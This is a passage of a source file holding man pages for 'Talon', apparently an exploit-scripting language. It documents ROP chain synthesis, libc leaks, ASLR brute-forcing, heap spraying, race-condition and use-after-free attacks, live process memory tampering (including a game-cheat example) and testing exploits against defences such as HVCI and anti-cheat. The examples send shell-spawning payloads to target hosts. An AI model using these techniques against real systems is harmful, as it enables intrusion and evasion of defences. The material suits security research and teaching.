.IP \(bu 2
Stage execution results
.IP \(bu 2
Connection information
.RE

.TP
.BI "load_chain_state " path
Load previously saved exploit state from JSON file.
Allows resuming complex multi-stage exploits across sessions.

.TP
.B chain_summary
Print detailed summary of exploit chain execution:
.RS
.IP \(bu 2
Number of stages completed
.IP \(bu 2
Addresses leaked and their values
.IP \(bu 2
Calculated bases
.IP \(bu 2
Stage results with timing
.RE

.SH EXAMPLES

.SS Basic Multi-Stage Exploitation
.nf
.B connect_to
"target.com"
.B port
1337

.B let
leak_payload = "A" * 72
.B exploit_leak
"stage1"
.B payload:
leak_payload
.B offset:
0
.B size:
8

.B calculate_base
leaked_value
.B offset:
0x24000
.B as
"libc_base"

.B let
system = libc_base + 0x55410
.B let
rop = p64(pop_rdi) + p64(binsh) + p64(system)

.B send
rop
.B interactive
.fi

.SS ASLR Bruteforce with Fallback
.nf
.B connect_to
"localhost"
.B port
9999

.B exploit_leak
"leak_attempt"
.B payload:
payload
.B offset:
80
.B size:
8

.B if
leaked_value == null:
    .B bruteforce_aslr
    .B attempts:
    5000
    .B payload:
    payload
    .B offset:
    80
.B end

.B calculate_base
leaked_value
.B offset:
0x1234
.B as
"pie_base"
.fi

.SS State Persistence
.nf
.RB # " Save state after successful leak"
.B save_chain_state
"exploit.json"

.RB # " Later: resume from saved state"
.B load_chain_state
"exploit.json"
.B chain_summary
.B interactive
.fi

.SS Integration with Auto-ROP
.nf
.B connect_to
"target.com"
.B port
4444

.B exploit_leak
"libc_leak"
.B payload:
("A" * 264)
.B offset:
256
.B size:
8

.B calculate_base
leaked_value
.B offset:
0x21b97
.B as
"libc_base"

.B auto_rop
"./binary"
    .B goal:
    "system(\\"/bin/sh\\")"
    .B libc_path:
    "/lib/x86_64-linux-gnu/libc.so.6"
    .B libc_base:
    libc_base
    .B constraints:
        - no_nulls
    .B end
.B end

.B send
rop_payload
.B interactive
.fi

.SH LEAK CLASSIFICATION

The exploit chaining engine automatically classifies leaked addresses:

.TP
.B LibcAddress
Addresses in range 0x7f0000000000 - 0x800000000000.
Typical of glibc mappings in x86_64 Linux.

.TP
.B StackAddress
Addresses in range 0x7ffffffde000 - 0x7ffffffff000.
Main thread stack region.

.TP
.B PIEBase
Addresses in range 0x555555554000 - 0x556000000000.
Position-independent executable base.

.TP
.B HeapAddress
User-space addresses outside other ranges, typically > 0x1000.

.TP
.B Canary
Stack protection cookies, often with characteristic patterns.

.TP
.B ReturnAddress
Code pointers in executable regions.

Confidence scoring considers:
.IP \(bu 2
Page alignment (addresses at 0x...000 gain +0.2)
.IP \(bu 2
Range matching (+0.3 for expected range)
.IP \(bu 2
Pointer validity

.SH CONDITIONAL EXECUTION

Full if/else support enables error recovery:

.nf
.B if
libc_base == null:
    print "[!] Leak failed, trying alternative..."
    .B bruteforce_aslr
    .B attempts:
    1000
    .B payload:
    alt_payload
    .B offset:
    0
.B end
.fi

Combine with TALON's control flow for complex logic:

.nf
.B for
attempt
.B in
0..10:
    .B connect_to
    "target.com"
    .B port
    1337
    .B exploit_leak
    "attempt"
    .B payload:
    leak_payload
    .B offset:
    0
    .B size:
    8
    .B if
    leaked_value != null:
        .B break
    .B end
.B end
.fi

.SH INTEGRATION

The exploit chaining framework integrates with:

.TP
.B Auto-ROP Solver
Use leaked libc base with
.B auto_rop
for automated ROP chain generation.

.TP
.B Heap Exploitation
Feed leaked heap addresses to
.B heap_exploit
for modern glibc attacks.

.TP
.B CVE Scanner
Chain
.B scan_cve
results into targeted exploitation.

.TP
.B Taint Analysis
Use
.B taint_analysis
to discover optimal leak primitives.

.SH FILES

.TP
.I exploit_state.json
Default state save file containing serialized exploit chain state.

.TP
.I rop_payload.bin
Generated ROP chain binary when integrating with auto-ROP.

.SH DIAGNOSTICS

The exploit chain engine provides detailed logging:

.TP
.B [CHAIN]
Connection and data transfer events

.TP
.B [STAGE]
Leak attempt results with timing

.TP
.B [SUMMARY]
Complete exploit statistics

Enable debug mode in code for hex dumps of all sent/received data.

.SH PERFORMANCE

.TP
.B Connection
Timeout configurable (default 5s)

.TP
.B Leak Extraction
Automatic, <5ms overhead per leak

.TP
.B ASLR Bruteforce
100-500 attempts/second (network bound)

.TP
.B State Persistence
JSON serialization, <10ms for typical chains

.SH SECURITY

.TP
.B Network
All connections use standard TCP sockets. For TLS, wrap with external proxy.

.TP
.B Isolation
No automatic code execution. User controls all payloads sent.

.TP
.B State Files
May contain sensitive leaked addresses. Secure appropriately.

.SH LIMITATIONS

.TP
.B Protocol
TCP only. UDP and custom protocols require manual implementation.

.TP
.B Architecture
Leak classification tuned for x86_64 Linux. Other architectures may need
manual leak type specification.

.TP
.B Bruteforce
Effective mainly on forking servers or 32-bit with limited ASLR entropy.

.SH NOTES

The exploit chaining framework maintains internal state across command
executions using serialized JSON in the interpreter's variable store.
This enables complex multi-stage workflows while remaining stateless
at the DSL level.

Leak confidence scoring is heuristic-based. Always verify critical
addresses before exploitation.

.SH SEE ALSO
.BR talon (1),
.BR talon-auto-rop (1),
.BR talon-heap (1),
.BR talon-cve (1),
.BR talon-taint (1),
.BR talon-safety (1)
"#;

const TALON_SAFETY_MAN: &str = r#".TH TALON-SAFETY 1 "2026-01-08" "Talon 0.1.0"
.SH NAME
talon-safety \- Runtime safety and resource management system
.SH SYNOPSIS
set_timeout, set_memory_limit, set_recursion_limit, enable_strict_mode, disable_strict_mode, get_safety_stats, reset_safety
.SH DESCRIPTION
Provides world-class runtime safety with automatic bounds checking, type validation, overflow protection, and resource limits. Prevents timeout, memory exhaustion, stack overflow, and common runtime errors.
.SH COMMANDS
.TP
.BI "set_timeout " milliseconds
Set maximum execution time (default: 300000ms).
.TP
.BI "set_memory_limit " megabytes
Set maximum memory usage (default: 512 MB).
.TP
.BI "set_recursion_limit " max_depth
Set maximum recursion depth (default: 1000).
.TP
.B enable_strict_mode
Enable all safety checks (type, bounds, overflow).
.TP
.B disable_strict_mode
Disable strict mode (keeps bounds checking active).
.TP
.B get_safety_stats
Display current resource usage and configuration.
.TP
.B reset_safety
Reset to default configuration.
.SH SAFETY FEATURES
Automatic bounds checking (always active), type checking (strict mode), integer overflow protection (strict mode), division by zero detection (strict mode), execution timeout, memory limits, recursion depth limiting.
.SH SEE ALSO
.BR talon (1),
.BR talon-chain (1)
"#;

const TALON_META_MAN: &str = r#".TH TALON-META 1 "2026-01-09" "Talon 0.1.0"
.SH NAME
talon-meta \- Meta-programming and AST introspection
.SH SYNOPSIS
get_ast, patch_function, generate_strategy, get_script_metadata, modify_ast
.SH DESCRIPTION
Enables scripts to examine and modify their own structure at runtime. Scripts become self-aware entities that can introspect their AST, generate new code based on target constraints, and patch function implementations dynamically.
.SH COMMANDS
.TP
.BI "get_ast " [script_path]
Returns the Abstract Syntax Tree of the current script or specified file. The AST can be queried to find specific node types, count commands, or analyze program structure.
.TP
.BI "patch_function " target_name " " replacement_code
Replaces a function implementation at runtime. Used for platform-specific adaptations where different OS/architectures require different implementations.
.TP
.BI "generate_strategy " goal " " constraints
AI-powered code generation that creates exploitation strategies based on goals (arbitrary_write, code_execution, information_leak) and constraints (no_null_bytes, nx_enabled, use_only_jop).
.TP
.B get_script_metadata
Returns metadata about the current script including total commands, function count, and AST depth.
.TP
.BI "modify_ast " transformations
Applies code transformations such as loop optimization, function inlining, and dead code elimination to the script's AST.
.SH EXAMPLES
.TP
Introspect script structure:
let ast = get_ast(current_script)
let writes = ast.find_nodes("MemoryWrite")
print("Will write to:", writes.addresses)
.TP
Generate strategy based on constraints:
let exploit = generate_strategy(
    goal: "arbitrary_write",
    constraints: ["no_null_bytes", "use_only_jop"]
)
execute(exploit)
.TP
Runtime function patching:
if target.os == "windows" {
    patch_function("find_gadgets", windows_implementation)
}
.SH SEE ALSO
.BR talon (1),
.BR talon-reactive (1),
.BR talon-event (1)
"#;

const TALON_REACTIVE_MAN: &str = r#".TH TALON-REACTIVE 1 "2026-01-09" "Talon 0.1.0"
.SH NAME
talon-reactive \- Reactive memory bindings to live target processes
.SH SYNOPSIS
bind_memory, unbind_memory, watch_memory
.SH DESCRIPTION
Creates reactive variables that are bound to target process memory. These variables automatically read from and write to live memory, enabling real-time monitoring and manipulation of running processes.
.SH COMMANDS
.TP
.BI "bind_memory " name " " address " " type
Creates a reactive variable bound to the specified memory address. Supported types: uint8, uint16, uint32, uint64, int8, int16, int32, int64, float32, float64, string, bytes.
.TP
.BI "unbind_memory " name
Removes a memory binding and stops automatic synchronization.
.TP
.BI "watch_memory " address " " size " " callback
Monitors a memory region and invokes the callback function when changes are detected.
.SH EXAMPLES
.TP
Bind to player health in a game:
let $health = bind_memory(session, 0x7ffd3010, type: "uint32")
loop {
    print("Health:", $health.value)
    if $health.value < 20 {
        $health.value = 100
    }
    sleep(100)
}
.TP
Monitor for memory modifications:
watch_memory(session, 0x401000, size: 256, callback: "on_code_modified")
.SH NOTES
Memory bindings use /proc/self/mem on Linux for direct memory access. On other platforms, bindings may be simulated or require additional privileges.
.SH SEE ALSO
.BR talon (1),
.BR talon-meta (1),
.BR talon-event (1)
"#;

const TALON_EVENT_MAN: &str = r#".TH TALON-EVENT 1 "2026-01-09" "Talon 0.1.0"
.SH NAME
talon-event \- Event-driven exploitation with native language constructs
.SH SYNOPSIS
on, watch, on_memory_change
.SH DESCRIPTION
Provides language-level event handling that reacts to target process behavior in real-time. Scripts can register handlers for memory changes, register modifications, function calls, and custom events.
.SH CONSTRUCTS
.TP
.BI "on " event_type " " [condition] " " { body }
Registers an event handler that executes when the specified event occurs. Event types include: memory_change, register_modified, function_called, breakpoint_hit, connection_established, data_received, exploit_success, exploit_failure.
.TP
.BI "watch " register " " [in range] " " { body }
Monitors a CPU register and triggers when its value enters the specified range. If no range is given, triggers on any change.
.TP
.BI "on_memory_change " address " " { body }
Specialized event handler for memory modifications at a specific address.
.SH EXAMPLES
.TP
React to anti-debug detection:
on session.memory_change(0x401000) {
    print("Code modified - anti-debug detected")
    let patch = analyze_patch(session, event.data)
    counter_anti_debug(patch)
}
.TP
Monitor instruction pointer:
watch session.register["rip"] in [0x400000, 0x500000] {
    print("Execution in expected range")
} else {
    print("Control flow hijacked!")
    interactive(session)
}
.SH PERFORMANCE
Event handlers run asynchronously and do not block the main execution thread. Memory watches poll at 10ms intervals by default.
.SH SEE ALSO
.BR talon (1),
.BR talon-reactive (1),
.BR talon-probabilistic (1)
"#;

const TALON_PROBABILISTIC_MAN: &str = r#".TH TALON-PROBABILISTIC 1 "2026-01-09" "Talon 0.1.0"
.SH NAME
talon-probabilistic \- Parallel and probabilistic execution primitives
.SH SYNOPSIS
try_all, race, tunable, optimize_tunable
.SH DESCRIPTION
Enables exploration of multiple attack paths simultaneously. Scripts can try different exploitation strategies in parallel, compete threads in race conditions, and self-optimize parameters based on success/failure feedback.
.SH COMMANDS
.TP
.BI "try_all " [timeout] " " { strategies }
Executes multiple exploitation strategies in parallel and returns the first successful result. Each strategy runs in its own thread.
.TP
.BI "race " [sync_gap] " " { threads }
Runs multiple threads with synchronized timing gaps, ideal for race condition exploitation where precise timing is required.
.TP
.BI "tunable " name " " initial " " range
Creates a self-optimizing parameter that learns optimal values based on success/failure feedback.
.TP
.BI "optimize_tunable " name " " direction " " [success]
Adjusts a tunable parameter based on execution results. Directions: higher, lower, auto.
.SH EXAMPLES
.TP
Try multiple strategies in parallel:
let winner = try_all timeout: "10s" {
    strategy_a: { rop_chain_using_libc(session) }
    strategy_b: { ret2syscall_with_pivot(session) }
    strategy_c: { shellcode_injection(session) }
}
.TP
Race condition exploitation:
race sync_gap: "5ms" {
    allocator: { allocate_chunks(session, 1000) }
    freer: { free_chunks(session, 1000) }
    exploiter: { trigger_uaf(session) }
}
.TP
Self-optimizing heap spray:
let spray_size = tunable(initial: 1024, range: [512, 8192])
for i in range(100) {
    if heap_spray(session, spray_size.value) {
        optimize_tunable(spray_size, direction: "higher")
    }
}
.SH PERFORMANCE
Parallel execution uses Tokio async runtime. Maximum concurrent strategies limited by system resources.
.SH SEE ALSO
.BR talon (1),
.BR talon-event (1),
.BR talon-checkpoint (1)
"#;

const TALON_CHECKPOINT_MAN: &str = r#".TH TALON-CHECKPOINT 1 "2026-01-09" "Talon 0.1.0"
.SH NAME
talon-checkpoint \- Script state persistence and strategy branching
.SH SYNOPSIS
checkpoint_script, resume_from_checkpoint, fork_strategy, merge_strategy
.SH DESCRIPTION
Enables saving and restoring complete script state including variables, network connections, and execution position. Scripts can checkpoint before risky operations, branch to experiment with alternative strategies, and merge successful approaches.
.SH COMMANDS
.TP
.BI "checkpoint_script " name
Saves complete script state including all variables, constants, network connections, and current execution point. Checkpoints are compressed and stored in the checkpoints/ directory.
.TP
.BI "resume_from_checkpoint " name
Restores script state from a saved checkpoint, rewinding execution to the checkpoint position with all state intact.
.TP
.BI "fork_strategy " name
Creates a branch of the current execution strategy, allowing experimentation with alternative approaches without affecting the main flow.
.TP
.BI "merge_strategy " source " " target
Integrates a successful forked strategy back into the main execution path.
.SH EXAMPLES
.TP
Checkpoint before risky operation:
checkpoint_script("before_exploit")
attempt_exploit(session)
if failed {
    resume_from_checkpoint("before_exploit")
    try_alternative_exploit(session)
}
.TP
Branch and test strategies:
let main = current_strategy()
let experiment = fork_strategy("alternative")
if test_strategy(experiment).success {
    merge_strategy(experiment, main)
}
.SH FILE FORMAT
Checkpoints are stored as gzip-compressed JSON files containing serialized script state. File size typically 10-100KB depending on variable count.
.SH NOTES
Network connections are serialized by connection ID. Resuming a checkpoint attempts to restore connections but may fail if remote endpoints are unavailable.
.SH SEE ALSO
.BR talon (1),
.BR talon-meta (1),
.BR talon-probabilistic (1)
"#;

const TALON_SYMBIOTIC_MAN: &str = r#".TH TALON-SYMBIOTIC 1 "2026-01-09" "Talon 0.1.0"
.SH NAME
talon-symbiotic \- Bidirectional state binding with target process
.SH SYNOPSIS
symlink, unsymlink, sync_symlinks
.SH DESCRIPTION
Binds TALON variables to target process memory via /proc/{pid}/mem (Linux only). Reading bound variables reads from remote memory; writing to bound variables writes to remote memory. Requires ptrace attach permissions on target process.
.SH COMMANDS
.TP
.BI "symlink " target_expr " to " var_name
Creates a symbiotic link. Target expressions support: segment offsets ($gs:[0x60]), memory addresses (0xdeadbeef), and symbol resolution (@libc!system).
.TP
.BI "unsymlink " var_name
Removes a symbiotic link and stops synchronization.
.TP
.B sync_symlinks
Manually synchronize all symlinks to detect changes.
.SH EXAMPLES
.TP
Link to Thread Environment Block:
symlink $gs:[0x60] to $teb
print("TEB address:", hex($teb))
.TP
Link to resolved symbol:
symlink @libc!system to $system_addr
print("system() is at:", hex($system_addr))
.TP
Write through symlink:
symlink $teb + 0x40 to $pid
$pid = 1337  // Writes directly to target memory
.SH NOTES
Uses memory_tools::read_process_memory() and write_process_memory(). Requires setting target PID before creating symlinks. Linux-only implementation using /proc/{pid}/mem interface. Target process must allow ptrace attach. Changes in target memory (ASLR rebasing, reallocations) may invalidate symlinks.
.SH SEE ALSO
.BR talon (1),
.BR talon-reactive (1),
.BR talon-meta (1)
"#;

const TALON_GOAL_PLANNER_MAN: &str = r#".TH TALON-GOAL-PLANNER 1 "2026-01-09" "Talon 0.1.0"
.SH NAME
talon-goal-planner \- Declarative goal-oriented exploit synthesis
.SH SYNOPSIS
achieve
.SH DESCRIPTION
Synthesizes ROP chains from high-level goals using Capstone disassembly and Z3 constraint solving. Analyzes target binaries to find gadgets, applies constraints, and generates executable AST commands (Command::VarDecl) with real gadget addresses.
.SH SYNTAX
.TP
.B achieve goal: "goal_type"
Synthesize exploit to achieve specified goal. Supported goals: arbitrary_write, code_execution, information_leak.
.TP
.B at address: addr
Target address for write operations.
.TP
.B with value: val
Value to write for write operations.
.TP
.B constraints: [constraint_list]
Constraints to satisfy: no_null_bytes, must_preserve_rdx, nx_enabled.
.TP
.B using primitives: [primitive_list]
Available exploit primitives: write4, read8, stack_pivot, rop_gadget, format_string, heap_spray.
.SH EXAMPLES
.TP
Synthesize arbitrary write:
achieve goal: "arbitrary_write"
    at address: 0xdeadbeef
    with value: 0xcafebabe
    constraints: [no_null_bytes]
    using primitives: [write4, stack_pivot]
.TP
Synthesize code execution:
achieve goal: "code_execution"
    constraints: [nx_enabled]
    using primitives: [rop_gadget, stack_pivot]
.SH HOW IT WORKS
The planner:
1. Uses set_binary() to analyze target with ROPGadgetFinder (Capstone)
2. Finds gadgets by category (StackPivot, LoadRegister, StoreMemory, ControlFlow)
3. Applies Z3 constraints (NoNullBytes, Alphanumeric, InRange)
4. Generates Command::VarDecl AST nodes with gadget addresses
5. Returns vector of executable TALON commands
.SH SEE ALSO
.BR talon (1),
.BR talon-strategy (1),
.BR talon-probabilistic (1)
"#;

const TALON_STRATEGY_MAN: &str = r#".TH TALON-STRATEGY 1 "2026-01-09" "Talon 0.1.0"
.SH NAME
talon-strategy \- Self-optimizing execution strategies
.SH SYNOPSIS
define strategy, execute_strategy
.SH DESCRIPTION
Parameterized strategies that automatically optimize using gradient descent. Parameters adjust based on execution feedback (success/failure). Uses EWMA for parameter blending and adaptive learning rates.
.SH SYNTAX
.TP
.B define strategy name { ... }
Defines a new strategy with tunable parameters and implementation.
.TP
.B parameters: { name: tunable(initial, range: [min, max]) }
Declares auto-optimizing parameters.
.TP
.B implementation: { ... }
Strategy execution logic using parameter values.
.TP
.B execute_strategy(name)
Executes strategy and records results for optimization.
.SH EXAMPLES
.TP
Self-optimizing heap spray:
define strategy heap_spray_strategy {
    parameters: {
        size: tunable(1024, range: [512, 8192]),
        count: tunable(100, range: [10, 500])
    }
    implementation: {
        attempt_spray(session, $size, $count)
        attempt_corruption(session)
    }
}
for i in range(100) {
    execute_strategy(heap_spray_strategy)
}
.SH OPTIMIZATION
Strategies track:
- Success/failure counts and success rate
- Recent 10 execution results for trend analysis
- Exponentially weighted moving average (0.9/0.1 weights)
- Gradient: success ? (1.0 - recent_rate) : -(1.0 - recent_rate)

Parameters auto-tune after 5+ attempts. Learning rate multiplied by 0.9 when succeeding (convergence), reset when failing. Methods: record_execution(), optimize_parameters(), get_parameter_history().
.SH SEE ALSO
.BR talon (1),
.BR talon-probabilistic (1),
.BR talon-goal-planner (1)
"#;

const TALON_SPECULATIVE_MAN: &str = r#".TH TALON-SPECULATIVE 1 "2026-01-09" "Talon 0.1.0"
.SH NAME
talon-speculative \- Predictive future execution and sandbox testing
.SH SYNOPSIS
speculate, precompute_futures
.SH DESCRIPTION
Execute commands in isolated child process to predict outcomes (Unix only). Uses fork/waitpid syscalls with signal-based crash detection. Returns outcome (success, crash, hang, security_violation) with 95% confidence on Unix, 70% on Windows (fallback pattern matching).
.SH COMMANDS
.TP
.B speculate { commands }
Executes commands in isolated sandbox. Returns outcome (success, crash, hang, security_violation), probability, side effects, and AI suggestions.
.TP
.B precompute_futures(branches)
Executes multiple alternative paths in parallel, returning results for all branches.
.SH EXAMPLES
.TP
Test gadget before committing:
let future = speculate {
    mem_write(session, 0x400000, pop_rdi_ret)
    execute_next_step(session)
}
if future.outcome == "crash" {
    print("WARNING:", future.suggestion)
} else {
    mem_write(session, 0x400000, pop_rdi_ret)
}
.TP
Precompute multiple strategies:
let results = precompute_futures([
    ("strategy_a", strategy_a_commands),
    ("strategy_b", strategy_b_commands),
    ("strategy_c", strategy_c_commands)
])
let best = select_best_future(results)
execute(best.commands)
.SH OUTCOME TYPES
- success: Clean exit (WIFEXITED with code 0)
- crash: SIGSEGV or SIGBUS detected
- hang: 5-second timeout exceeded (killed with SIGKILL)
- security_violation: Other signal detected
- unknown: Fork failed or waitpid error
.SH IMPLEMENTATION
Unix: unsafe { libc::fork() }, libc::waitpid() with WNOHANG, signal detection via WTERMSIG. Windows fallback: pattern matching on function names (contains "crash" or "segfault").
.SH SEE ALSO
.BR talon (1),
.BR talon-checkpoint (1),
.BR talon-strategy (1)
"#;

const TALON_VULN_FORECAST_MAN: &str = r#".TH TALON-VULN-FORECAST 1 "2026-01-09" "Talon 0.1.0"
.SH NAME
talon-vuln-forecast \- Vulnerability prediction and risk analysis
.SH SYNOPSIS
analyze_target
.SH DESCRIPTION
Analyzes binaries using goblin (ELF/PE/Mach-O parsing), Capstone disassembly, and CVE database matching. Scores exploitability based on binary protections (NX, PIE, canary) and symbol analysis.
.SH COMMAND
.TP
.BI "analyze_target " binary_path
Returns vulnerability forecast including patch gaps, risk map, hotspots, and recommendations.
.SH FORECAST COMPONENTS
.TP
.B patch_gaps
Known CVEs likely present based on version analysis. Includes severity and exploitability scores.
.TP
.B risk_map
Function-level risk scores based on dangerous patterns (memcpy, strcpy, malloc).
.TP
.B hotspots
High-risk locations prioritized for fuzzing/analysis with historical CVE similarity scores.
.TP
.B recommendations
AI-generated guidance on where to start analysis.
.SH EXAMPLES
.TP
Analyze binary:
let forecast = analyze_target("./target_binary")
print("Patch Gaps:", forecast.patch_gaps)
print("Hotspots:", forecast.hotspots)
for rec in forecast.recommendations {
    print(rec)
}
.SH IMPLEMENTATION
- Uses goblin::Object::parse() for binary structure analysis
- Disassembles .text section with Capstone when symbols unavailable
- Integrates BinaryAnalyzer for protections (NX, PIE, canary, RELRO)
- Exploitability score: base 0.5, +0.2 no NX, +0.15 no PIE, +0.15 no canary
- Symbol analysis: detects strcpy, memcpy, malloc, free, parse functions
- CVE database: Matches based on symbols (SMB, kernel, nt) and OS metadata
.SH SEE ALSO
.BR talon (1),
.BR talon-defense-sim (1)
"#;

const TALON_DEFENSE_SIM_MAN: &str = r#".TH TALON-DEFENSE-SIM 1 "2026-01-09" "Talon 0.1.0"
.SH NAME
talon-defense-sim \- Adversarial defense simulation and stress testing
.SH SYNOPSIS
defense_simulator
.SH DESCRIPTION
Tests exploit commands against defense profiles using deterministic pattern matching. Matches Command enum variants against mitigation rules with cumulative scoring (no random number generation).
.SH COMMAND
.TP
.BI "defense_simulator(profile: " name ", exploit: " commands ", iterations: " N ")"
Runs exploit against simulated defense profile for N iterations. Returns success rate, detection rate, blocked attempts, and recommendations.
.SH PROFILES
.TP
.B Windows_11_HVCI
Hypervisor-Protected Code Integrity, Kernel Control Flow Guard, DEP. Effectiveness: 90-95%.
.TP
.B SELinux_Enforcing
Mandatory Access Control, Type Enforcement. Effectiveness: 88-92%.
.TP
.B GameGuard_AntiCheat
Memory integrity checks, anti-debug, code injection detection. Effectiveness: 75-85%.
.SH EXAMPLES
.TP
Test against Windows HVCI:
let result = defense_simulator(
    profile: "Windows_11_HVCI",
    exploit: my_exploit,
    iterations: 500
)
print("Success rate:", result.success_rate * 100, "%")
print("Detection rate:", result.detection_rate * 100, "%")
for rec in result.recommendations {
    print(rec)
}
.SH IMPLEMENTATION
- Deterministic detection (no RNG)
- Cumulative scoring: dangerous_operations * 0.15 and suspicious_syscalls * 0.1
- Pattern matching: Command::RunCommand, Command::WriteFile, Command::DumpMemory, etc.
- Profile-specific logic: HVCI blocks WriteFile/DumpMemory/RunCommand, kCFG blocks RunCommand/Connect
- Returns: success rate, detection rate, blocked count, and context-aware recommendations
.SH SEE ALSO
.BR talon (1),
.BR talon-vuln-forecast (1),
.BR talon-speculative (1)
"#;

const TALON_FRACTAL_MAN: &str = r#".TH TALON-FRACTAL 1 "2026-01-09" "Talon 0.1.0"
.SH NAME
talon-fractal \- Auto-assembling exploit primitives
.SH SYNOPSIS
primitive, assemble
.SH DESCRIPTION
Defines small, composable exploit primitives that automatically assemble into complex constructs (ROP chains, write-what-where, stack pivots). The assembler finds gadgets, adds necessary instructions, handles alignment, and optimizes payloads.
.SH COMMANDS
.TP
.BI "primitive(" type ": " params ")"
Creates an exploit primitive. Types: address (memory write), stack_pointer (pivot), jump_to (control flow).
.TP
.BI "assemble([" primitives "])"
Auto-assembles primitives into exploit construct. Returns assembled structure with gadgets, payload, and description.
.SH PRIMITIVE TYPES
.TP
.B Write: primitive(address: addr, value: val)
Memory write operation.
.TP
.B Stack Pivot: primitive(stack_pointer: addr)
Stack pointer modification.
.TP
.B Jump: primitive(jump_to: addr)
Control flow transfer.
.SH EXAMPLES
.TP
Auto-assemble ROP chain:
let prim_write = primitive(address: 0x601050, value: 0xdeadbeef)
let prim_pivot = primitive(stack_pointer: 0x7ffeef00)
let prim_exec = primitive(jump_to: $system_addr)

let chain = assemble([prim_write, prim_pivot, prim_exec])
print("Chain type:", chain.name)
print("Gadgets:", chain.gadgets)
print("Payload:", hex(chain.payload))

send(session, chain.payload)
.SH AUTOMATIC FEATURES
- Gadget database lookup
- ret instruction insertion
- 8-byte alignment padding
- Chain type detection (ROP, WWW, Pivot)
- Payload size optimization
.SH SEE ALSO
.BR talon (1),
.BR talon-goal-planner (1),
.BR talon-strategy (1)
"#;
